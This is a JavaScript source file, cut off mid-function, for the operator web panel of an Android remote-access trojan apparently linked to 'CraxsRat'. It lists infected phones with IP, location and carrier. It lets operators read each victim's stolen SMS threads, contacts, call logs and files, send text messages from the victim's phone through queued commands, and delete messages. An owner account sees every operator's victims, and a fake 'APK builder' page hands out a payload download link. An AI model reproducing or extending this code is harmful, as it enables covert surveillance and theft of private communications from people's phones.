import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
import { getDatabase, ref, onValue, query, limitToLast, remove, set, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
import { auth, app } from './auth.js';

document.addEventListener('DOMContentLoaded', function () {
    const database = getDatabase(app);
    let fullFileTree = {};
    let currentUser, currentDeviceKey;
    let newNotification = false;
    let newConnection = false;

    const OWNER_UID = 'LTd7MLB048WuhuQdGEqhALC9pEk2';

    // Security: Input sanitization
    function sanitizeHTML(str) {
        if (typeof str !== 'string') return '';
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    function escapeHTML(str) {
        // Accept any input, coerce to string, then escape special chars.
        if (str === null || str === undefined) return '';
        const s = String(str);
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return s.replace(/[&<>"']/g, m => map[m]);
    }

    // Helper: coerce to finite number or default
    function safeNumber(val, def = 0) {
        if (val === null || val === undefined) return def;
        const n = Number(val);
        return Number.isFinite(n) ? n : def;
    }

    // Helper: format bytes (input can be number, string, or undefined)
    function formatBytes(bytes) {
        const n = safeNumber(bytes, 0);
        return (n / 1024 / 1024).toFixed(2);
    }

    onAuthStateChanged(auth, (user) => {
        const loginView = document.getElementById('login-view');
        const panelView = document.getElementById('panel-view');
        
        if (user) {
            // Validate user object
            if (!user.uid || !user.email) {
                signOut(auth);
                return;
            }
            
            currentUser = user;
            
            // Show panel, hide login
            if (loginView) loginView.style.display = 'none';
            if (panelView) panelView.style.display = 'flex';
            
            loadPanelForUser(user);
            listenForNewNotifications(user);
            listenForDeviceChanges(user);
        } else {
            // Show login, hide panel
            if (loginView) loginView.style.display = 'flex';
            if (panelView) panelView.style.display = 'none';
        }
    });

    function listenForNewNotifications(user) {
        const path = user.uid === OWNER_UID ? 'users' : `users/${user.uid}`;
        const notificationsRef = query(ref(database, `${path}/notifications`), limitToLast(1));
        onValue(notificationsRef, () => {
            if(document.querySelector(".sidebar-nav li[data-page='notifications']").classList.contains('active')) return;
            newNotification = true;
            updateNotificationIndicator();
        });
    }

    function listenForDeviceChanges(user) {
        // Listen to device-level changes. For the owner we flatten all users' devices
        // into a single map keyed by "<ownerUid>/<deviceKey>" so we can detect
        // per-device connection transitions. For regular users we watch their
        // `users/<uid>/devices` node directly.
        const devicesRef = ref(database, user.uid === OWNER_UID ? 'users' : `users/${user.uid}/devices`);
        let previousDevices = {};
        let initialLoad = true;

        onValue(devicesRef, (snapshot) => {
            const currentDevices = {};

            if (user.uid === OWNER_UID) {
                // snapshot contains all users; flatten each user's devices
                snapshot.forEach(userSnapshot => {
                    const ownerId = userSnapshot.key;
                    if (!ownerId) return;
                    const userDevices = userSnapshot.child('devices').val() || {};
                    Object.keys(userDevices).forEach(deviceKey => {
                        const globalKey = `${ownerId}/${deviceKey}`;
                        currentDevices[globalKey] = userDevices[deviceKey];
                    });
                });
            } else {
                const devices = snapshot.val() || {};
                Object.keys(devices).forEach(deviceKey => {
                    currentDevices[deviceKey] = devices[deviceKey];
                });
            }

            if (initialLoad) {
                // Prime the baseline and don't generate notifications for existing
                // devices on first attach.
                previousDevices = currentDevices;
                initialLoad = false;
                return;
            }

            const allKeys = new Set([...Object.keys(previousDevices), ...Object.keys(currentDevices)]);
            allKeys.forEach(key => {
                const prev = previousDevices[key];
                const curr = currentDevices[key];
                const wasConnected = prev && prev.status === 'CONNECTED';
                const isConnected = curr && curr.status === 'CONNECTED';

                if (!wasConnected && isConnected) {
                    // New connection
                    if (!document.querySelector(".sidebar-nav li[data-page='connections']").classList.contains('active')) {
                        newConnection = true;
                        updateConnectionIndicator();
                    }
                } else if (wasConnected && !isConnected) {
                    // Disconnection: write a notification under the device owner's notifications
                    const parts = key.split('/');
                    const deviceId = parts.pop();
                    const ownerId = parts.join('/') || user.uid;
                    const notificationText = `${deviceId} disconnected at ${new Date().toLocaleString()}`;
                    const notificationsRef = ref(database, `users/${ownerId}/notifications`);
                    const newNotificationRef = push(notificationsRef);
                    set(newNotificationRef, notificationText);
                }
            });

            previousDevices = currentDevices;
        });
    }

    function updateNotificationIndicator() {
        const notificationIcon = document.querySelector('[data-page="notifications"] i');
        if (newNotification) {
            notificationIcon.classList.add('new-notification');
        } else {
            notificationIcon.classList.remove('new-notification');
        }
    }
    
    function updateConnectionIndicator() {
        const connectionIcon = document.querySelector('[data-page="connections"] i');
        if (newConnection) {
            connectionIcon.classList.add('new-notification');
        } else {
            connectionIcon.classList.remove('new-notification');
        }
    }

    function loadPanelForUser(user) {
        const navLinks = document.querySelectorAll('[data-page]');
        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const page = link.dataset.page;
                if (!page) return;
                
                // Handle logout separately (will be handled in navigateTo)
                if (page === 'logout') {
                    navigateTo(page, user);
                    return;
                }
                
                // Reset notification indicators when visiting those pages
                if (page === 'notifications') {
                    newNotification = false;
                    updateNotificationIndicator();
                }
                if (page === 'connections') {
                    newConnection = false;
                    updateConnectionIndicator();
                }
                
                // Update active state
                document.querySelectorAll('.sidebar-nav li').forEach(li => li.classList.remove('active'));
                if(link.closest('li')) link.closest('li').classList.add('active');
                
                // Persist last-opened page per user (owner and regular users)
                try {
                    if (user && user.uid && page !== 'logout') {
                        localStorage.setItem(`xhero:lastPage:${user.uid}`, page);
                    }
                } catch (err) {
                    // ignore storage errors (e.g., private mode)
                }

                // Navigate to page
                navigateTo(page, user);
            });
        });
        // Restore last page for this user if available, otherwise default to 'clients'
        try {
            const last = user && user.uid ? localStorage.getItem(`xhero:lastPage:${user.uid}`) : null;
            navigateTo(last || 'clients', user);
        } catch (err) {
            navigateTo('clients', user);
        }
    }

    function navigateTo(page, user) {
        // Handle logout separately
        if (page === 'logout') {
            signOut(auth).then(() => {
                // Auth state change will handle view switching
            }).catch((error) => {});
            return;
        }

        const mainContentArea = document.getElementById('main-content-area');
        if (!mainContentArea) return;
        
        const icon = getPageIcon(page);
        const title = page.charAt(0).toUpperCase() + page.slice(1);
        mainContentArea.innerHTML = `<header class="content-header"><h1><i class="material-icons">${escapeHTML(icon)}</i> ${escapeHTML(title)}</h1></header><div id="page-content"></div>`;
        const pageContent = document.getElementById('page-content');
        if (!pageContent) return;

        switch (page) {
            case 'clients': loadClientsPage(pageContent, user); break;
            case 'connections': loadConnectionsPage(pageContent, user); break;
            case 'builder': loadBuilderPage(pageContent); break;
            case 'notifications': loadNotificationsPage(pageContent, user); break;
            case 'profile': loadProfilePage(pageContent, user); break;
            case 'screens': pageContent.innerHTML = '<p>Screen capture feature coming soon.</p>'; break;
            case 'blocked': pageContent.innerHTML = '<p>Blocked devices list coming soon.</p>'; break;
            case 'updates': pageContent.innerHTML = '<p>No updates yet.</p>'; break;
            case 'servers': pageContent.innerHTML = '<p>Contact Admin.</p>'; break;
            default: pageContent.innerHTML = '<p>Coming Soon</p>'; break;
        }
    }

    function getPageIcon(page) {
        const icons = { clients: 'people', connections: 'link', builder: 'build', notifications: 'notifications', updates: 'update', servers: 'dns', profile: 'person', screens: 'screenshot', blocked: 'block', logout: 'logout' };
        return icons[page] || 'help';
    }

    function loadClientsPage(container, user) {
        container.innerHTML = `
            <section class="summary-cards">
                <div class="summary-card">
                    <i class="material-icons">link</i>
                    <div class="label">Online</div>
                    <div class="value" id="online-count">0</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">devices</i>
                    <div class="label">Total Devices</div>
                    <div class="value" id="total-count">0</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">upload</i>
                    <div class="label">Sent</div>
                    <div class="value" id="sent-count">0.00 MB</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">download</i>
                    <div class="label">Received</div>
                    <div class="value" id="received-count">0.00 MB</div>
                </div>
            </section>
            <div id="device-card-container"></div>
        `;
        attachDeviceListener(user);
        attachClientsStatsListener(user);
    }
    
    function loadConnectionsPage(container, user) {
        container.innerHTML = `
             <div class="connections-header">
                <h3>Connection Statistics</h3>
                <p>Monitor your device connections and data transfer</p>
             </div>
             <section class="summary-cards">
                <div class="summary-card">
                    <i class="material-icons">link</i>
                    <div class="label">Online</div>
                    <div class="value" id="online-count">0</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">devices</i>
                    <div class="label">Total Devices</div>
                    <div class="value" id="total-count">0</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">upload</i>
                    <div class="label">Sent</div>
                    <div class="value" id="sent-count">0 MB</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">download</i>
                    <div class="label">Received</div>
                    <div class="value" id="received-count">0 MB</div>
                </div>
             </section>
             <div class="connections-info">
                <p>For support, contact: <a href="https://t.me/CraxsRat_EU" target="_blank">@CraxsRat_EU</a></p>
             </div>
        `;
        attachConnectionsPageListeners(user);
    }

    function loadBuilderPage(container) {
        container.innerHTML = `
            <div class="builder-container">
                <div class="builder-header">
                    <h2>APK Builder</h2>
                    <p>Build and customize your application package</p>
                </div>
                <div class="builder-options">
                    <div class="option-group">
                        <label>Package Name</label>
                        <input type="text" id="package-name" placeholder="com.example.app" value="com.xhero.client">
                    </div>
                    <div class="option-group">
                        <label>App Name</label>
                        <input type="text" id="app-name" placeholder="My App" value="xHERO Client">
                    </div>
                    <div class="option-group">
                        <label>APK Download URL</label>
                        <input type="url" id="apk-url" placeholder="https://example.com/app.apk" value="">
                    </div>
                </div>
                <button id="build-apk-btn">
                    <i class="material-icons">build</i>
                    <span>Build APK</span>
                </button>
                <div class="console" id="build-console" style="display:none;">
                    <div class="console-header">
                        <i class="material-icons">terminal</i>
                        Build Console
                    </div>
                    <div class="console-body" id="console-output"></div>
                </div>
            </div>
        `;

        document.getElementById('build-apk-btn').addEventListener('click', function() {
            this.disabled = true; // Disable button during build
            const consoleOutput = document.getElementById('console-output');
            const buildConsole = document.getElementById('build-console');
            buildConsole.style.display = 'block';
            consoleOutput.innerHTML = '';

            const steps = [
                'Initializing build process...',
                'Compiling resources...',
                'Executing build scripts...',
                'Assembling APK package...',
                'Build successful! Your APK is ready.'
            ];

            let stepIndex = 0;

            function processNextStep() {
                if (stepIndex < steps.length) {
                    const p = document.createElement('p');
                    consoleOutput.appendChild(p);
                    const text = steps[stepIndex];
                    let charIndex = 0;

                    function typeChar() {
                        if (charIndex < text.length) {
                            p.textContent += text.charAt(charIndex);
                            charIndex++;
                            consoleOutput.scrollTop = consoleOutput.scrollHeight;
                            setTimeout(typeChar, 50);
                        } else {
                            stepIndex++;
                            setTimeout(processNextStep, 500);
                        }
                    }
                    typeChar();
                } else {
                    const apkUrl = document.getElementById('apk-url').value;
                    if (apkUrl) {
                        const downloadLink = document.createElement('a');
                        downloadLink.href = apkUrl;
                        downloadLink.textContent = 'Download APK';
                        downloadLink.className = 'download-link';
                        downloadLink.target = '_blank';
                        consoleOutput.appendChild(downloadLink);
                    } else {
                        const p = document.createElement('p');
                        p.textContent = 'Please provide an APK download URL in the field above.';
                        p.style.color = 'var(--accent-blue)';
                        consoleOutput.appendChild(p);
                    }
                    consoleOutput.scrollTop = consoleOutput.scrollHeight;
                    document.getElementById('build-apk-btn').disabled = false; // Re-enable button
                }
            }
            processNextStep();
        });
    }

    function loadProfilePage(container, user) {
        // Security: Use textContent for user data
        const profileContainer = document.createElement('div');
        profileContainer.className = 'profile-container';
        
        const profileCard = document.createElement('div');
        profileCard.className = 'profile-card';
        
        const profileHeader = document.createElement('div');
        profileHeader.className = 'profile-header';
        profileHeader.innerHTML = `
            <div class="profile-avatar">
                <i class="material-icons">person</i>
            </div>
            <div class="profile-info">
                <h2></h2>
                <p>Operator Account</p>
            </div>
        `;
        profileHeader.querySelector('h2').textContent = user.email || 'Unknown';
        
        const profileDetails = document.createElement('div');
        profileDetails.className = 'profile-details';
        profileDetails.innerHTML = `
            <div class="detail-item">
                <span class="detail-label">User ID</span>
                <span class="detail-value"></span>
            </div>
            <div class="detail-item">
                <span class="detail-label">Account Type</span>
                <span class="detail-value">Premium</span>
            </div>
            <div class="detail-item">
                <span class="detail-label">Support</span>
                <a href="https://t.me/CraxsRat_EU" target="_blank" rel="noopener noreferrer" class="detail-link">Contact Admin</a>
            </div>
        `;
        profileDetails.querySelector('.detail-value').textContent = user.uid || 'Unknown';
        
        profileCard.appendChild(profileHeader);
        profileCard.appendChild(profileDetails);
        profileContainer.appendChild(profileCard);
        container.appendChild(profileContainer);
    }

    function loadNotificationsPage(container, user) {
        const path = user.uid === OWNER_UID ? 'users' : `users/${user.uid}`;
        const notificationsRef = query(ref(database, `${path}/notifications`), limitToLast(100));
        onValue(notificationsRef, (snapshot) => {
            container.innerHTML = `
                <div class="notifications-header">
                    <h3>Recent Notifications</h3>
                    <p>Stay updated with device activity</p>
                </div>
                <table class="data-table notifications-table">
                    <thead>
                        <tr>
                            <th>Device</th>
                            <th>Message</th>
                            <th>Timestamp</th>
                        </tr>
                    </thead>
                    <tbody></tbody>
                </table>
            `;
            const tableBody = container.querySelector('tbody');
            const notifications = snapshot.val();
            if (notifications && Object.keys(notifications).length > 0) {
                Object.values(notifications).reverse().forEach(notifText => {
                    const parts = notifText.split(' at ');
                    const timestamp = parts.pop();
                    const deviceAndMessage = parts.join(' at ');

                    let message = '';
                    let device = '';

                    if (deviceAndMessage.endsWith(' disconnected')) {
                        message = 'disconnected';
                        device = deviceAndMessage.replace(' disconnected', '');
                    } else if (deviceAndMessage.endsWith(' connected')) {
                        message = 'connected';
                        device = deviceAndMessage.replace(' connected', '');
                    }

                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${device.trim()}</td>
                        <td>${message}</td>
                        <td>${timestamp}</td>
                    `;
                    tableBody.appendChild(row);
                });
            } else {
                const row = document.createElement('tr');
                row.innerHTML = `<td colspan="3">No notifications yet.</td>`;
                tableBody.appendChild(row);
            }
        });
    }

    let previousDevicesList = new Set();
    
    function attachDeviceListener(user) {
        const path = user.uid === OWNER_UID ? 'users' : `users/${user.uid}`;
        const userDevicesRef = ref(database, path);

        onValue(userDevicesRef, (snapshot) => {
            const container = document.getElementById('device-card-container');
            if (!container) return;
            container.innerHTML = '';

            if (user.uid === OWNER_UID) {
                snapshot.forEach(userSnapshot => {
                    if (userSnapshot.key === OWNER_UID) return; // FIX: Don't show owner's own devices
                    const userDevices = userSnapshot.child('devices').val();
                    if (userDevices) {
                        Object.keys(userDevices).forEach(deviceKey => {
                            const card = createDeviceCard(deviceKey, userDevices[deviceKey], userSnapshot.key, user);
                            container.appendChild(card);
                        });
                    }
                });
            } else {
                const devices = snapshot.child('devices').val();
                if (devices) {
                    Object.keys(devices).forEach(deviceKey => {
                        const card = createDeviceCard(deviceKey, devices[deviceKey], user.uid, user);
                        container.appendChild(card);
                    });
                }
            }
        });
    }
    
    function attachClientsStatsListener(user) {
        const path = user.uid === OWNER_UID ? 'users' : `users/${user.uid}`;
        const userDevicesRef = ref(database, path);
        onValue(userDevicesRef, (snapshot) => {
            const sentEl = document.getElementById('sent-count');
            const receivedEl = document.getElementById('received-count');
            
            let sentBytes = 0, receivedBytes = 0;

            if (user.uid === OWNER_UID) {
                snapshot.forEach(userSnapshot => {
                    if (userSnapshot.key === OWNER_UID) return; // FIX: Don't count owner's own stats
                    const userDevices = userSnapshot.child('devices').val();
                    if (userDevices) {
                        Object.keys(userDevices).forEach(deviceKey => {
                            const device = userDevices[deviceKey];
                            if (device.stats) {
                                sentBytes += device.stats.sent || 0;
                                receivedBytes += device.stats.received || 0;
                            }
                        });
                    }
                });
            } else {
                const devices = snapshot.child('devices').val();
                if (devices) {
                    Object.keys(devices).forEach(deviceKey => {
                        const device = devices[deviceKey];
                        if (device.stats) {
                            sentBytes += device.stats.sent || 0;
                            receivedBytes += device.stats.received || 0;
                        }
                    });
                }
            }
            
            if (sentEl) sentEl.textContent = (sentBytes / 1024 / 1024).toFixed(2) + ' MB';
            if (receivedEl) receivedEl.textContent = (receivedBytes / 1024 / 1024).toFixed(2) + ' MB';
        });
    }

    function attachConnectionsPageListeners(user) {
        const path = user.uid === OWNER_UID ? 'users' : `users/${user.uid}`;
        const userDevicesRef = ref(database, path);
        onValue(userDevicesRef, (snapshot) => {
            const onlineEl = document.getElementById('online-count');
            const totalEl = document.getElementById('total-count');
            const sentEl = document.getElementById('sent-count');
            const receivedEl = document.getElementById('received-count');
            
            let onlineCount = 0, totalCount = 0, sentBytes = 0, receivedBytes = 0;
    
            if (user.uid === OWNER_UID) {
                snapshot.forEach(userSnapshot => {
                    if (userSnapshot.key === OWNER_UID) return; // FIX: Don't count owner's own devices/stats
                    const userDevices = userSnapshot.child('devices').val();
                    if (userDevices) {
                        totalCount += Object.keys(userDevices).length;
                        Object.keys(userDevices).forEach(deviceKey => {
                            const device = userDevices[deviceKey];
                            if (device.status === 'CONNECTED') onlineCount++;
                            if (device.stats) {
                                sentBytes += device.stats.sent || 0;
                                receivedBytes += device.stats.received || 0;
                            }
                        });
                    }
                });
            } else {
                const devices = snapshot.child('devices').val();
                if (devices) {
                    totalCount = Object.keys(devices).length;
                    Object.keys(devices).forEach(deviceKey => {
                        const device = devices[deviceKey];
                        if (device.status === 'CONNECTED') onlineCount++;
                        if (device.stats) {
                            sentBytes += device.stats.sent || 0;
                            receivedBytes += device.stats.received || 0;
                        }
                    });
                }
            }
    
            if (onlineEl) onlineEl.textContent = onlineCount;
            if (totalEl) totalEl.textContent = totalCount;
            if (sentEl) sentEl.textContent = (sentBytes / 1024 / 1024).toFixed(2) + ' MB';
            if (receivedEl) receivedEl.textContent = (receivedBytes / 1024 / 1024).toFixed(2) + ' MB';
        });
    }

    function createDeviceCard(deviceKey, deviceData, deviceOwnerUid, user, isNewDevice = false) {
        const card = document.createElement('article');
        card.className = 'device-card';
        if (isNewDevice) {
            card.classList.add('new-client-connected');
        }

        if (typeof stringToColor === 'function') {
            try {
                const accentColor = stringToColor(deviceKey);
                if (accentColor) {
                    card.style.setProperty('--device-accent', accentColor);
                }
            } catch (error) {
                // ignore coloring failures
            }
        }

        const status = deviceData.status || 'UNKNOWN';
        const isOnline = status === 'CONNECTED';
        const model = deviceData.model || deviceKey || 'Unknown device';
        const displayName = deviceData.model || deviceKey;
        const vendor = deviceData.brand || deviceData.manufacturer || 'Unknown vendor';
        const androidVersion = deviceData.androidVersion || 'N/A';
        const lastSeen = deviceData.lastSeenReadable || deviceData.lastSeen || 'N/A';
        const batteryRaw = deviceData.batteryLevel ?? deviceData.battery ?? null;
        let batteryDisplay = 'N/A';
        if (batteryRaw !== null && batteryRaw !== undefined) {
            batteryDisplay = typeof batteryRaw === 'number' ? `${batteryRaw}%` : `${batteryRaw}`;
        }
        const carrier = deviceData.carrier || deviceData.networkOperator || deviceData.simOperator || 'N/A';
        const networkType = deviceData.networkType || deviceData.connectionType || '';
        const ipAddress = deviceData.ipAddress || deviceData.ip || deviceData.localIp || '';
        const location = deviceData.location || deviceData.country || deviceData.region || deviceData.city || '';
        const uptime = deviceData.uptimeReadable || deviceData.uptime || '';
    const sentMB = formatBytes(deviceData.stats?.sent);
    const receivedMB = formatBytes(deviceData.stats?.received);

        const metrics = [
            { label: 'Last Seen', value: lastSeen },
            { label: 'Android', value: androidVersion },
            { label: 'Battery', value: batteryDisplay },
            { label: 'Carrier', value: carrier },
            { label: 'Sent', value: `${sentMB} MB` },
            { label: 'Received', value: `${receivedMB} MB` }
        ];

        if (networkType) {
            metrics.push({ label: 'Network', value: networkType });
        }
        if (uptime) {
            metrics.push({ label: 'Uptime', value: uptime });
        }

        const metaChips = [];
        if (!deviceData.model) {
            metaChips.push(`Device ID: ${deviceKey}`);
        }
        if (ipAddress) {
            metaChips.push(`IP: ${ipAddress}`);
        }
        if (location) {
            metaChips.push(`Location: ${String(location).replace(/_/g, ' ')}`);
        }

        // Security: Create metrics safely
        const metricsMarkup = metrics.map(metric => `
            <div class="device-metric">
                <span class="metric-label">${escapeHTML(metric.label)}</span>
                <span class="metric-value">${escapeHTML(metric.value)}</span>
            </div>
        `).join('');

        const metaChipsMarkup = metaChips.length > 0 ? metaChips.map(chip => `<span class="meta-chip">${escapeHTML(chip)}</span>`).join('') : '';
        const deviceInitial = displayName.charAt(0).toUpperCase() || 'D';

        // Security: Use textContent for user data to prevent XSS
        const deviceTop = document.createElement('div');
        deviceTop.className = 'device-top';
        deviceTop.innerHTML = `
            <div class="device-identity">
                <div class="device-avatar">${escapeHTML(deviceInitial)}</div>
                <div>
                    <p class="device-name">${escapeHTML(displayName)}</p>
                    <p class="device-subtitle">${escapeHTML(vendor)}${androidVersion !== 'N/A' ? ` - Android ${escapeHTML(androidVersion)}` : ''}</p>
                </div>
            </div>
            <div class="device-status ${isOnline ? 'is-online' : ''}">
                <span class="status-indicator"></span>
                ${escapeHTML(status)}
            </div>
        `;
        
        const deviceActions = document.createElement('div');
        deviceActions.className = 'device-actions';
        deviceActions.innerHTML = `
            <button data-action="sms" title="View SMS Threads">
                <i class="material-icons">sms</i>
                <span>SMS</span>
            </button>
            <button data-action="contacts" title="View Contacts">
                <i class="material-icons">contacts</i>
                <span>Contacts</span>
            </button>
            <button data-action="call_logs" title="View Call Logs">
                <i class="material-icons">call</i>
                <span>Call Logs</span>
            </button>
            <button data-action="files" title="Open File Manager">
                <i class="material-icons">folder</i>
                <span>Files</span>
            </button>
            <button data-action="delete" title="Remove Client">
                <i class="material-icons">delete_forever</i>
                <span>Remove</span>
            </button>
        `;
        
        card.appendChild(deviceTop);
        card.appendChild(deviceActions);
        
        if (metaChipsMarkup) {
            const metaTags = document.createElement('div');
            metaTags.className = 'device-meta-tags';
            metaTags.innerHTML = metaChipsMarkup;
            card.appendChild(metaTags);
        }
        
        const deviceMetrics = document.createElement('div');
        deviceMetrics.className = 'device-metrics';
        deviceMetrics.innerHTML = metricsMarkup;
        card.appendChild(deviceMetrics);

        card.querySelector('button[data-action="sms"]').addEventListener('click', () => openSmsModal(deviceKey, model, user, deviceOwnerUid));
        card.querySelector('button[data-action="contacts"]').addEventListener('click', () => openContactsModal(deviceKey, model, user, deviceOwnerUid));
        card.querySelector('button[data-action="call_logs"]').addEventListener('click', () => openCallLogsModal(deviceKey, model, user, deviceOwnerUid));
        card.querySelector('button[data-action="files"]').addEventListener('click', () => openFileManagerModal(deviceKey, model, user, deviceOwnerUid));
        card.querySelector('button[data-action="delete"]').addEventListener('click', () => deleteClient(deviceKey, user, deviceOwnerUid));

        return card;
    }

    function deleteClient(deviceKey, user, deviceOwnerUid) {
        const confirmModal = document.getElementById('confirm-modal');
        const confirmText = document.getElementById('confirm-modal-text');
        confirmText.textContent = `Are you sure you want to remove ${escapeHTML(deviceKey)}? This cannot be undone.`;
        confirmModal.style.display = 'flex';

        document.getElementById('confirm-modal-ok').onclick = () => {
            const deviceRef = ref(database, `users/${deviceOwnerUid}/devices/${deviceKey}`);
            remove(deviceRef);
            confirmModal.style.display = 'none';
        };

        document.getElementById('confirm-modal-cancel').onclick = () => {
            confirmModal.style.display = 'none';
        };
    }

    function openSmsModal(deviceKey, deviceName, user, deviceOwnerUid) {
        const modal = document.getElementById('data-modal');
        const titleEl = document.getElementById('data-modal-title');
        titleEl.textContent = `SMS for ${escapeHTML(deviceName)}`;
        const modalBody = document.getElementById('data-modal-body');
        modalBody.innerHTML = '<p>Loading...</p>';
        modal.style.display = 'flex';
        const dataRef = ref(database, `users/${deviceOwnerUid}/devices/${deviceKey}/sms`);

        onValue(dataRef, (snapshot) => {
            modalBody.innerHTML = ''; 
            
            const sendForm = document.createElement('div');
            sendForm.className = 'sms-send-form';
            sendForm.innerHTML = `
                <textarea id="sms-message-text" placeholder="Type a message..."></textarea>
                <input type="text" id="sms-recipient" placeholder="Recipient phone number">
                <button id="sms-send-button">Send</button>
            `;
            modalBody.appendChild(sendForm);

            document.getElementById('sms-send-button').addEventListener('click', () => {
                const messageText = document.getElementById('sms-message-text').value;
                const recipient = document.getElementById('sms-recipient').value;
                // Security: Validate inputs
                if (messageText && recipient && messageText.length <= 1000 && recipient.length <= 50) {
                    const commandRef = ref(database, `users/${deviceOwnerUid}/devices/${deviceKey}/commands`);
                    const newCommandRef = push(commandRef);
                    set(newCommandRef, { 
                        type: 'sendsms', 
                        recipient: recipient.trim(), 
                        message: messageText.trim() 
                    });
                    document.getElementById('sms-message-text').value = '';
                    document.getElementById('sms-recipient').value = '';
                } else {
                    alert('Invalid input. Message must be under 1000 characters and recipient under 50 characters.');
                }
            });

            const conversations = snapshot.val();
            if (conversations) {
                const smsContainer = document.createElement('div');
                smsContainer.className = 'sms-container';

                const sortedConversations = Object.entries(conversations).map(([address, messages]) => {
                    const messageList = Object.entries(messages).map(([id, data]) => ({ id, ...parseSmsData(data) }));
                    const latestMessage = messageList.reduce((latest, msg) => (new Date(msg.timestamp) > new Date(latest.timestamp)) ? msg : latest, messageList[0]);
                    return { address, messages: messageList, latestTimestamp: new Date(latestMessage.timestamp) };
                }).sort((a, b) => {
                    const aIsLetter = /^[a-zA-Z]/.test(a.address);
                    const bIsLetter = /^[a-zA-Z]/.test(b.address);
                    if (aIsLetter && !bIsLetter) return -1;
                    if (!aIsLetter && bIsLetter) return 1;
                    return b.latestTimestamp - a.latestTimestamp;
                });

                sortedConversations.forEach(({ address, messages }) => {
                    const conversationDiv = document.createElement('div');
                    conversationDiv.className = 'sms-conversation';
                    const header = document.createElement('div');
                    header.className = 'sms-header';
                    header.innerHTML = '<strong>From:</strong> ';
                    const addressSpan = document.createElement('span');
                    addressSpan.textContent = address.replace(/_/g, '.');
                    header.appendChild(addressSpan);
                    conversationDiv.appendChild(header);
                    
                    const messagesDiv = document.createElement('div');
                    messagesDiv.className = 'sms-messages';

                    messages.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));

                    messages.forEach(msg => {
                        const messageBubble = document.createElement('div');
                        messageBubble.className = 'sms-bubble';
                        const bodyDiv = document.createElement('div');
                        bodyDiv.className = 'sms-body';
                        bodyDiv.textContent = msg.body || '';
                        const footerDiv = document.createElement('div');
                        footerDiv.className = 'sms-footer';
                        footerDiv.textContent = msg.timestamp || '';
                        const deleteBtn = document.createElement('button');
                        deleteBtn.className = 'sms-delete-button';
                        deleteBtn.setAttribute('data-address', escapeHTML(address));
                        deleteBtn.setAttribute('data-message-id', escapeHTML(msg.id));
                        deleteBtn.innerHTML = '<i class="material-icons">delete</i>';
                        messageBubble.appendChild(bodyDiv);
                        messageBubble.appendChild(footerDiv);
                        messageBubble.appendChild(deleteBtn);
                        messagesDiv.appendChild(messageBubble);
                    });
                    conversationDiv.appendChild(messagesDiv);
                    smsContainer.appendChild(conversationDiv);
                });

                modalBody.appendChild(smsContainer);

                modalBody.addEventListener('click', (e) => {
                    const deleteButton = e.target.closest('.sms-delete-button');
                    if (deleteButton) {
                        const address = deleteButton.dataset.address;
                        const messageId = deleteButton.dataset.messageId;
                        const messageRef = ref(database, `users/${deviceOwnerUid}/devices/${deviceKey}/sms/${address}/${messageId}`);
                        remove(messageRef);
                    }
                });

            } else {
                const noSmsMessage = document.createElement('p');
                noSmsMessage.textContent = 'No SMS data found.';
                modalBody.appendChild(noSmsMessage);
            }
        });
    }

    function parseSmsData(data) {
        const parts = data.split(' | ');
        return { timestamp: parts[0] || 'N/A', body: parts.slice(1).join(' | ') || 'N/A' };
    }
    
    function openContactsModal(deviceKey, deviceName, user, deviceOwnerUid) {
        const modal = document.getElementById('data-modal');
        const titleEl = document.getElementById('data-modal-title');
        titleEl.textContent = `Contacts for ${escapeHTML(deviceName)}`;
        const modalBody = document.getElementById('data-modal-body');
        modalBody.innerHTML = '<p>Loading...</p>';
        modal.style.display = 'flex';
        const dataRef = ref(database, `users/${deviceOwnerUid}/devices/${deviceKey}/contacts`);
        onValue(dataRef, (snapshot) => {
            const data = snapshot.val();
            modalBody.innerHTML = '';
            if (data && Object.keys(data).length > 0) {
                const table = document.createElement('table');
                table.className = 'data-table';
                table.innerHTML = `<thead><tr><th>Name</th><th>Number</th></tr></thead>`;
                const tableBody = document.createElement('tbody');
                Object.values(data).forEach(item => {
                    const parts = item.split(' | ');
                    const name = parts[0] || 'N/A';
                    const number = parts[1] || 'N/A';
                    const row = document.createElement('tr');
                    const nameCell = document.createElement('td');
                    nameCell.textContent = name;
                    const numberCell = document.createElement('td');
                    numberCell.textContent = number;
                    row.appendChild(nameCell);
                    row.appendChild(numberCell);
                    tableBody.appendChild(row);
                });
                table.appendChild(tableBody);
                modalBody.appendChild(table);
            } else {
                modalBody.innerHTML = '<p>No contacts found.</p>';
            }
        }, { once: true });
    }

    function openCallLogsModal(deviceKey, deviceName, user, deviceOwnerUid) {
        const modal = document.getElementById('data-modal');
        const titleEl = document.getElementById('data-modal-title');
        titleEl.textContent = `Call Logs for ${escapeHTML(deviceName)}`;
        const modalBody = document.getElementById('data-modal-body');
        modalBody.innerHTML = '<p>Loading...</p>';
        modal.style.display = 'flex';
        const dataRef = ref(database, `users/${deviceOwnerUid}/devices/${deviceKey}/call_logs`);
        onValue(dataRef, (snapshot) => {
            const data = snapshot.val();
            modalBody.innerHTML = '';
            if (data && Object.keys(data).length > 0) {
                const table = document.createElement('table');
                table.className = 'data-table';
                table.innerHTML = `<thead><tr><th>Number</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead>`;
                const tableBody = document.createElement('tbody');
                Object.values(data).forEach(item => {
                    const parts = item.split(' | ');
                    const number = parts[0] || 'N/A';
                    const type = parts[1] || 'N/A';
                    const duration = parts[2] || 'N/A';
                    const date = parts[3] || 'N/A';
                    const row = document.createElement('tr');
                    const numberCell = document.createElement('td');
                    numberCell.textContent = number;
                    const typeCell = document.createElement('td');
                    typeCell.textContent = type;
                    const durationCell = document.createElement('td');
                    durationCell.textContent = duration;
